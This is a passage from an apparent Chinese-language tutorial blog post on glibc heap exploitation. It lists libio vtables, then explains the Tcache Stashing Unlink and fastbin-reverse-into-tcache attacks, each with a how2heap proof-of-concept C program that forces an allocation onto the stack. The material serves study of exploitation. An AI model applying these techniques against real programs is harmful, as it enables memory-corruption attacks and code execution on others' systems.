class="title">IO_jump_t</span> _<span class="title">IO_wfile_jumps</span> <span class="title">libio_vtable</span> =</span></span><br><span class="line">&#123;</span><br><span class="line">  JUMP_INIT_DUMMY,</span><br><span class="line">  JUMP_INIT(finish, _IO_new_file_finish),</span><br><span class="line">  JUMP_INIT(overflow, (_IO_overflow_t) _IO_wfile_overflow),</span><br><span class="line">  JUMP_INIT(underflow, (_IO_underflow_t) _IO_wfile_underflow),</span><br><span class="line">  JUMP_INIT(uflow, (_IO_underflow_t) _IO_wdefault_uflow),</span><br><span class="line">  JUMP_INIT(pbackfail, (_IO_pbackfail_t) _IO_wdefault_pbackfail),</span><br><span class="line">  JUMP_INIT(xsputn, _IO_wfile_xsputn),</span><br><span class="line">  JUMP_INIT(xsgetn, _IO_file_xsgetn),</span><br><span class="line">  JUMP_INIT(seekoff, _IO_wfile_seekoff),</span><br><span class="line">  JUMP_INIT(seekpos, _IO_default_seekpos),</span><br><span class="line">  JUMP_INIT(setbuf, _IO_new_file_setbuf),</span><br><span class="line">  JUMP_INIT(sync, (_IO_sync_t) _IO_wfile_sync),</span><br><span class="line">  JUMP_INIT(doallocate, _IO_wfile_doallocate),</span><br><span class="line">  JUMP_INIT(read, _IO_file_read),</span><br><span class="line">  JUMP_INIT(write, _IO_new_file_write),</span><br><span class="line">  JUMP_INIT(seek, _IO_file_seek),</span><br><span class="line">  JUMP_INIT(close, _IO_file_close),</span><br><span class="line">  JUMP_INIT(stat, _IO_file_stat),</span><br><span class="line">  JUMP_INIT(showmanyc, _IO_default_showmanyc),</span><br><span class="line">  JUMP_INIT(imbue, _IO_default_imbue)</span><br><span class="line">&#125;;</span><br><span class="line">libc_hidden_data_def (_IO_wfile_jumps)</span><br></pre></td></tr></table></figure><h4 id="IO-printf-buffer-as-file-jumps"><a href="#IO-printf-buffer-as-file-jumps" class="headerlink" title="_IO_printf_buffer_as_file_jumps"></a>_IO_printf_buffer_as_file_jumps</h4><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">static</span> <span class="type">const</span> <span class="class"><span class="keyword">struct</span> _<span class="title">IO_jump_t</span> _<span class="title">IO_printf_buffer_as_file_jumps</span> <span class="title">libio_vtable</span> =</span></span><br><span class="line">&#123;</span><br><span class="line">  JUMP_INIT_DUMMY,</span><br><span class="line">  JUMP_INIT(finish, <span class="literal">NULL</span>),</span><br><span class="line">  JUMP_INIT(overflow, __printf_buffer_as_file_overflow),<span class="comment">//函数一</span></span><br><span class="line">  JUMP_INIT(underflow, <span class="literal">NULL</span>),</span><br><span class="line">  JUMP_INIT(uflow, <span class="literal">NULL</span>),</span><br><span class="line">  JUMP_INIT(pbackfail, <span class="literal">NULL</span>),</span><br><span class="line">  JUMP_INIT(xsputn, __printf_buffer_as_file_xsputn),<span class="comment">//函数二</span></span><br><span class="line">  JUMP_INIT(xsgetn, <span class="literal">NULL</span>),</span><br><span class="line">  JUMP_INIT(seekoff, <span class="literal">NULL</span>),</span><br><span class="line">  JUMP_INIT(seekpos, <span class="literal">NULL</span>),</span><br><span class="line">  JUMP_INIT(setbuf, <span class="literal">NULL</span>),</span><br><span class="line">  JUMP_INIT(sync, <span class="literal">NULL</span>),</span><br><span class="line">  JUMP_INIT(doallocate, <span class="literal">NULL</span>),</span><br><span class="line">  JUMP_INIT(read, <span class="literal">NULL</span>),</span><br><span class="line">  JUMP_INIT(write, <span class="literal">NULL</span>),</span><br><span class="line">  JUMP_INIT(seek, <span class="literal">NULL</span>),</span><br><span class="line">  JUMP_INIT(close, <span class="literal">NULL</span>),</span><br><span class="line">  JUMP_INIT(stat, <span class="literal">NULL</span>),</span><br><span class="line">  JUMP_INIT(showmanyc, <span class="literal">NULL</span>),</span><br><span class="line">  JUMP_INIT(imbue, <span class="literal">NULL</span>)</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><h4 id="IO-cookie-jumps"><a href="#IO-cookie-jumps" class="headerlink" title="_IO_cookie_jumps"></a>_IO_cookie_jumps</h4><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">static</span> <span class="type">const</span> <span class="class"><span class="keyword">struct</span> _<span class="title">IO_jump_t</span> _<span class="title">IO_cookie_jumps</span> <span class="title">libio_vtable</span> =</span> &#123;</span><br><span class="line">  JUMP_INIT_DUMMY,</span><br><span class="line">  JUMP_INIT(finish, _IO_file_finish),</span><br><span class="line">  JUMP_INIT(overflow, _IO_file_overflow),</span><br><span class="line">  JUMP_INIT(underflow, _IO_file_underflow),</span><br><span class="line">  JUMP_INIT(uflow, _IO_default_uflow),</span><br><span class="line">  JUMP_INIT(pbackfail, _IO_default_pbackfail),</span><br><span class="line">  JUMP_INIT(xsputn, _IO_file_xsputn),</span><br><span class="line">  JUMP_INIT(xsgetn, _IO_default_xsgetn),</span><br><span class="line">  JUMP_INIT(seekoff, _IO_cookie_seekoff),</span><br><span class="line">  JUMP_INIT(seekpos, _IO_default_seekpos),</span><br><span class="line">  JUMP_INIT(setbuf, _IO_file_setbuf),</span><br><span class="line">  JUMP_INIT(sync, _IO_file_sync),</span><br><span class="line">  JUMP_INIT(doallocate, _IO_file_doallocate),</span><br><span class="line">  JUMP_INIT(read, _IO_cookie_read),</span><br><span class="line">  JUMP_INIT(write, _IO_cookie_write),</span><br><span class="line">  JUMP_INIT(seek, _IO_cookie_seek),</span><br><span class="line">  JUMP_INIT(close, _IO_cookie_close),</span><br><span class="line">  JUMP_INIT(stat, _IO_default_stat),</span><br><span class="line">  JUMP_INIT(showmanyc, _IO_default_showmanyc),</span><br><span class="line">  JUMP_INIT(imbue, _IO_default_imbue),</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><h3 id="Tcache-Stashing-Unlink-Attack"><a href="#Tcache-Stashing-Unlink-Attack" class="headerlink" title="Tcache Stashing Unlink Attack"></a>Tcache Stashing Unlink Attack</h3><ul><li>利用流程<br>1、假设目前<code>tcache bin</code>中已经有五个堆块，并且相应大小的<code>small bin</code>中已经有两个堆块，由<code>bk</code>指针连接为：<code>chunk_A&lt;-chunk_B</code><br>2、利用漏洞修改<code>chunk_A</code>的<code>bk</code>为<code>fake chunk</code>，并且修改<code>fake chunk</code>的<code>bk</code>为<code>target_addr - 0x10</code><br>3、通过<code>calloc()</code>越过<code>tcache bin</code>，直接从<code>small bin</code>中取出<code>chunk_B</code>返回给用户，并且会将<code>chunk_A</code>以及其所指向的<code>fake chunk</code>放入<code>tcache bin</code>（这里只会检测<code>chunk_A</code>的<code>fd</code>指针是否指向了<code>chunk_B</code>）<br>4、在<code>fake chunk</code>放入<code>tcache bin</code>之前，执行了<code>bck-&gt;fd = bin;</code>的操作（这里的<code>bck</code>就是<code>fake chunk</code>的<code>bk</code>，也就是<code>target_addr - 0x10</code>），故<code>target_addr - 0x10</code>的<code>fd</code>，也就<code>target_addr</code>地址会被写入一个与<code>libc</code>相关大数值（可利用）<br>5、再申请一次，就可以从<code>tcache</code>中获得<code>fake chunk</code>的控制权</li></ul><h4 id="poc-how2heap"><a href="#poc-how2heap" class="headerlink" title="poc(how2heap):"></a>poc(how2heap):</h4><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// glibc 2.36</span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;assert.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span>&#123;</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">long</span> stack_var[<span class="number">0x10</span>] = &#123;<span class="number">0</span>&#125;;</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">long</span> *chunk_lis[<span class="number">0x10</span>] = &#123;<span class="number">0</span>&#125;;</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">long</span> *target;</span><br><span class="line"></span><br><span class="line">    setbuf(<span class="built_in">stdout</span>, <span class="literal">NULL</span>);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;This file demonstrates the stashing unlink attack on tcache.\n\n&quot;</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;This poc has been tested on both glibc-2.27, glibc-2.29 and glibc-2.31.\n\n&quot;</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;This technique can be used when you are able to overwrite the victim-&gt;bk pointer. Besides, it&#x27;s necessary to alloc a chunk with calloc at least once. Last not least, we need a writable address to bypass check in glibc\n\n&quot;</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;The mechanism of putting smallbin into tcache in glibc gives us a chance to launch the attack.\n\n&quot;</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;This technique allows us to write a libc addr to wherever we want and create a fake chunk wherever we need. In this case we&#x27;ll create the chunk on the stack.\n\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// stack_var emulate the fake_chunk we want to alloc to</span></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Stack_var emulates the fake chunk we want to alloc to.\n\n&quot;</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;First let&#x27;s write a writeable address to fake_chunk-&gt;bk to bypass bck-&gt;fd = bin in glibc. Here we choose the address of stack_var[2] as the fake bk. Later we can see *(fake_chunk-&gt;bk + 0x10) which is stack_var[4] will be a libc addr after attack.\n\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">    stack_var[<span class="number">3</span>] = (<span class="type">unsigned</span> <span class="type">long</span>)(&amp;stack_var[<span class="number">2</span>]);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;You can see the value of fake_chunk-&gt;bk is:%p\n\n&quot;</span>,(<span class="type">void</span>*)stack_var[<span class="number">3</span>]);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Also, let&#x27;s see the initial value of stack_var[4]:%p\n\n&quot;</span>,(<span class="type">void</span>*)stack_var[<span class="number">4</span>]);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Now we alloc 9 chunks with malloc.\n\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">//now we malloc 9 chunks</span></span><br><span class="line">    <span class="keyword">for</span>(<span class="type">int</span> i = <span class="number">0</span>;i &lt; <span class="number">9</span>;i++)&#123;</span><br><span class="line">        chunk_lis[i] = (<span class="type">unsigned</span> <span class="type">long</span>*)<span class="built_in">malloc</span>(<span class="number">0x90</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">//put 7 chunks into tcache</span></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Then we free 7 of them in order to put them into tcache. Carefully we didn&#x27;t free a serial of chunks like chunk2 to chunk9, because an unsorted bin next to another will be merged into one after another malloc.\n\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span>(<span class="type">int</span> i = <span class="number">3</span>;i &lt; <span class="number">9</span>;i++)&#123;</span><br><span class="line">        <span class="built_in">free</span>(chunk_lis[i]);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;As you can see, chunk1 &amp; [chunk3,chunk8] are put into tcache bins while chunk0 and chunk2 will be put into unsorted bin.\n\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">//last tcache bin</span></span><br><span class="line">    <span class="built_in">free</span>(chunk_lis[<span class="number">1</span>]);</span><br><span class="line">    <span class="comment">//now they are put into unsorted bin</span></span><br><span class="line">    <span class="built_in">free</span>(chunk_lis[<span class="number">0</span>]);</span><br><span class="line">    <span class="built_in">free</span>(chunk_lis[<span class="number">2</span>]);</span><br><span class="line"></span><br><span class="line">    <span class="comment">//convert into small bin</span></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Now we alloc a chunk larger than 0x90 to put chunk0 and chunk2 into small bin.\n\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">malloc</span>(<span class="number">0xa0</span>);<span class="comment">// size &gt; 0x90</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">//now 5 tcache bins</span></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Then we malloc two chunks to spare space for small bins. After that, we now have 5 tcache bins and 2 small bins\n\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">malloc</span>(<span class="number">0x90</span>);</span><br><span class="line">    <span class="built_in">malloc</span>(<span class="number">0x90</span>);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Now we emulate a vulnerability that can overwrite the victim-&gt;bk pointer into fake_chunk addr: %p.\n\n&quot;</span>,(<span class="type">void</span>*)stack_var);</span><br><span class="line"></span><br><span class="line">    <span class="comment">//change victim-&gt;bck</span></span><br><span class="line">    <span class="comment">/*VULNERABILITY*/</span></span><br><span class="line">    chunk_lis[<span class="number">2</span>][<span class="number">1</span>] = (<span class="type">unsigned</span> <span class="type">long</span>)stack_var;</span><br><span class="line">    <span class="comment">/*VULNERABILITY*/</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">//trigger the attack</span></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Finally we alloc a 0x90 chunk with calloc to trigger the attack. The small bin preiously freed will be returned to user, the other one and the fake_chunk were linked into tcache bins.\n\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">calloc</span>(<span class="number">1</span>,<span class="number">0x90</span>);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Now our fake chunk has been put into tcache bin[0xa0] list. Its fd pointer now point to next free chunk: %p and the bck-&gt;fd has been changed into a libc addr: %p\n\n&quot;</span>,(<span class="type">void</span>*)stack_var[<span class="number">2</span>],(<span class="type">void</span>*)stack_var[<span class="number">4</span>]);</span><br><span class="line"></span><br><span class="line">    <span class="comment">//malloc and return our fake chunk on stack</span></span><br><span class="line">    target = <span class="built_in">malloc</span>(<span class="number">0x90</span>);   </span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;As you can see, next malloc(0x90) will return the region our fake chunk: %p\n&quot;</span>,(<span class="type">void</span>*)target);</span><br><span class="line"></span><br><span class="line">    assert(target == &amp;stack_var[<span class="number">2</span>]);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="fastbin-reverse-into-tcache"><a href="#fastbin-reverse-into-tcache" class="headerlink" title="fastbin reverse into tcache"></a>fastbin reverse into tcache</h3><ul><li>利用流程:<br>1、申请<code>14</code>个<code>fastbin</code>范围内的<code>chunk</code>，然后释放<code>7</code>个用来填满<code>tcache</code>，然后将剩下的七个释放进<code>fastbin</code>中<br>2、修改第一个放进<code>fastbin</code>的<code>chunk</code>的<code>fd</code>为<code>&amp;target</code><br>3、通过申请<code>7</code>个<code>chunk</code>将<code>tcache</code>清空<br>4、申请一个<code>chunk</code>,此时由于<code>tcache</code>中已经没有<code>chunk</code>了，所以会去<code>fastbin</code>里拿，然后将<code>fastbin</code>中剩余的<code>chunk</code>转到<code>tcache</code>中，<code>fastbin</code>中有<code>7</code>个，分配一个，剩下六个，依次放进<code>tcache</code>中，而最先放入<code>fastbin</code>中的<code>chunk</code>的<code>fd</code>被我们改成了<code>&amp;target</code>，所以<code>tcache</code>会将<code>target</code>也当做一个<code>chunk</code>放进<code>tcache</code>中<br>5、此时<code>tcache</code>中有<code>7</code>个<code>chunk</code>，最后一个<code>chunk</code>即为<code>target</code></li></ul><h4 id="poc-how2heap-1"><a href="#poc-how2heap-1" class="headerlink" title="poc(how2heap):"></a>poc(how2heap):</h4><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// glibc 2.36</span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;assert.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">const</span> <span class="type">size_t</span> allocsize = <span class="number">0x40</span>;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span>&#123;</span><br><span class="line">setbuf(<span class="built_in">stdout</span>, <span class="literal">NULL</span>);</span><br><span class="line"></span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;\n&quot;</span></span><br><span class="line">   <span class="string">&quot;This attack is intended to have a similar effect to the unsorted_bin_attack,\n&quot;</span></span><br><span class="line">   <span class="string">&quot;except it works with a small allocation size (allocsize &lt;= 0x78).\n&quot;</span></span><br><span class="line">   <span class="string">&quot;The goal is to set things up so that a call to malloc(allocsize) will write\n&quot;</span></span><br><span class="line">   <span class="string">&quot;a large unsigned value to the stack.\n\n&quot;</span>);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;After the patch https://sourceware.org/git/?p=glibc.git;a=commitdiff;h=a1a486d70ebcc47a686ff5846875eacad0940e41,\n&quot;</span></span><br><span class="line">   <span class="string">&quot;An heap address leak is needed to perform this attack.\n&quot;</span></span><br><span class="line">   <span class="string">&quot;The same patch also ensures the chunk returned by tcache is properly aligned.\n\n&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">// Allocate 14 times so that we can free later.</span></span><br><span class="line"><span class="type">char</span>* ptrs[<span class="number">14</span>];</span><br><span class="line"><span class="type">size_t</span> i;</span><br><span class="line"><span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; <span class="number">14</span>; i++) &#123;</span><br><span class="line">ptrs[i] = <span class="built_in">malloc</span>(allocsize);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;First we need to free(allocsize) at least 7 times to fill the tcache.\n&quot;</span></span><br><span class="line">     <span class="string">&quot;(More than 7 times works fine too.)\n\n&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">// Fill the tcache.</span></span><br><span class="line"><span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; <span class="number">7</span>; i++) <span class="built_in">free</span>(ptrs[i]);</span><br><span class="line"></span><br><span class="line"><span class="type">char</span>* victim = ptrs[<span class="number">7</span>];</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;The next pointer that we free is the chunk that we&#x27;re going to corrupt: %p\n&quot;</span></span><br><span class="line">   <span class="string">&quot;It doesn&#x27;t matter if we corrupt it now or later. Because the tcache is\n&quot;</span></span><br><span class="line">   <span class="string">&quot;already full, it will go in the fastbin.\n\n&quot;</span>, victim);</span><br><span class="line"><span class="built_in">free</span>(victim);</span><br><span class="line"></span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;Next we need to free between 1 and 6 more pointers. These will also go\n&quot;</span></span><br><span class="line">   <span class="string">&quot;in the fastbin. If the stack address that we want to overwrite is not zero\n&quot;</span></span><br><span class="line">   <span class="string">&quot;then we need to free exactly 6 more pointers, otherwise the attack will\n&quot;</span></span><br><span class="line">   <span class="string">&quot;cause a segmentation fault. But if the value on the stack is zero then\n&quot;</span></span><br><span class="line">   <span class="string">&quot;a single free is sufficient.\n\n&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">// Fill the fastbin.</span></span><br><span class="line"><span class="keyword">for</span> (i = <span class="number">8</span>; i &lt; <span class="number">14</span>; i++) <span class="built_in">free</span>(ptrs[i]);</span><br><span class="line"></span><br><span class="line"><span class="comment">// Create an array on the stack and initialize it with garbage.</span></span><br><span class="line"><span class="type">size_t</span> stack_var[<span class="number">6</span>];</span><br><span class="line"><span class="built_in">memset</span>(stack_var, <span class="number">0xcd</span>, <span class="keyword">sizeof</span>(stack_var));</span><br><span class="line"></span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;The stack address that we intend to target: %p\n&quot;</span></span><br><span class="line">   <span class="string">&quot;It&#x27;s current value is %p\n&quot;</span>, &amp;stack_var[<span class="number">2</span>], (<span class="type">char</span>*)stack_var[<span class="number">2</span>]);</span><br><span class="line"></span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;Now we use a vulnerability such as a buffer overflow or a use-after-free\n&quot;</span></span><br><span class="line"><span class="string">&quot;to overwrite the next pointer at address %p\n\n&quot;</span>, victim);</span><br><span class="line"></span><br><span class="line"><span class="comment">//------------VULNERABILITY-----------</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// Overwrite linked list pointer in victim.</span></span><br><span class="line"><span class="comment">// The following operation assumes the address of victim is known, thus requiring</span></span><br><span class="line"><span class="comment">// a heap leak.</span></span><br><span class="line">*(<span class="type">size_t</span>**)victim = (<span class="type">size_t</span>*)((<span class="type">long</span>)&amp;stack_var[<span class="number">0</span>] ^ ((<span class="type">long</span>)victim &gt;&gt; <span class="number">12</span>));</span><br><span class="line"></span><br><span class="line"><span class="comment">//------------------------------------</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;The next step is to malloc(allocsize) 7 times to empty the tcache.\n\n&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">// Empty tcache.</span></span><br><span class="line"><span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; <span class="number">7</span>; i++) ptrs[i] = <span class="built_in">malloc</span>(allocsize);</span><br><span class="line"></span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;Let&#x27;s just print the contents of our array on the stack now,\n&quot;</span></span><br><span class="line"><span class="string">&quot;to show that it hasn&#x27;t been modified yet.\n\n&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; <span class="number">6</span>; i++) <span class="built_in">printf</span>(<span class="string">&quot;%p: %p\n&quot;</span>, &amp;stack_var[i], (<span class="type">char</span>*)stack_var[i]);</span><br><span class="line"></span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;\n&quot;</span></span><br><span class="line">   <span class="string">&quot;The next allocation triggers the stack to be overwritten. The tcache\n&quot;</span></span><br><span class="line">   <span class="string">&quot;is empty, but the fastbin isn&#x27;t, so the next allocation comes from the\n&quot;</span></span><br><span class="line">   <span class="string">&quot;fastbin. Also, 7 chunks from the fastbin are used to refill the tcache.\n&quot;</span></span><br><span class="line">   <span class="string">&quot;Those 7 chunks are copied in reverse order into the tcache, so the stack\n&quot;</span></span><br><span class="line">   <span class="string">&quot;address that we are targeting ends up being the first chunk in the tcache.\n&quot;</span></span><br><span class="line">   <span class="string">&quot;It contains a pointer to the next chunk in the list, which is why a heap\n&quot;</span></span><br><span class="line">   <span class="string">&quot;pointer is written to the stack.\n&quot;</span></span><br><span class="line">   <span class="string">&quot;\n&quot;</span></span><br><span class="line">   <span class="string">&quot;Earlier we said that the attack will also work if we free fewer than 6\n&quot;</span></span><br><span class="line">   <span class="string">&quot;extra pointers to the fastbin, but only if the value on the stack is zero.\n&quot;</span></span><br><span class="line">   <span class="string">&quot;That&#x27;s because the value on the stack is treated as a next pointer in the\n&quot;</span></span><br><span class="line">   <span class="string">&quot;linked list and it will trigger a crash if it isn&#x27;t a valid pointer or null.\n&quot;</span></span><br><span class="line">   <span class="string">&quot;\n&quot;</span></span><br><span class="line">   <span class="string">&quot;The contents of our array on the stack now look like this:\n\n&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="built_in">malloc</span>(allocsize);</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; <span class="number">6</span>; i++) <span class="built_in">printf</span>(<span class="string">&quot;%p: %p\n&quot;</span>, &amp;stack_var[i], (<span class="type">char</span>*)stack_var[i]);</span><br><span class="line"></span><br><span class="line"><span class="type">char</span> *q = <span class="built_in">malloc</span>(allocsize);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;\n&quot;</span></span><br><span class="line"><span class="string">&quot;Finally, if we malloc one more time then we get the stack address back: %p\n&quot;</span>, q);</span><br><span class="line"></span><br><span class="line">assert(q == (<span class="type">char</span> *)&amp;stack_var[<span class="number">2</span>]);</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span 